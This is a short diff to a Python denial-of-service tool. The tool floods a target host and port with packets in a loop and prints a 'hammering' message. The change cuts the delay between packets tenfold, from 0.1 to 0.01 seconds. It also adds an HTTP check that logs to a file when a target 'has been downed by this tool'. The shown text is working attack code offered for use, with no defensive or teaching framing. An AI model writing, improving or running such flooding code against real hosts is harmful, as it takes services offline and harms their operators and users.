@@ -30,15 +30,19 @@ Connection: keep-alive"""
             if s.sendto( packet, (host, int(port))):
                 s.shutdown(1)
                 print ("\033[94m <--packet sent to {0}:{1}! hammering--> \033[0m".format(host, int(port)))
+            elif requests.head(f"http://{host}").status_code != 200:
+                with open("Down.txt","a") as dw:
+                    dw.write(f"{host}:{port} has been downed by this tool on Day : {times[0]}, Month : {times[1]}:{times[2]}, Time : {times[3]}, Year : {times[4]}\n")
             else:
                 s.shutdown(1)
                 print("\033[91m shut<->down\033[0m")
-            time.sleep(.1)
-    except socket.error as e:
-        print("\033[91m Socket error, Error {0}\033[0m".format(e))
+            time.sleep(.01)
+    except socket.error:
+        print("\033[91m Socket error, cannot connect to host!\033[0m")
         time.sleep(2)
     except KeyboardInterrupt:
         exit()
+
 
 def dos():
     while True:
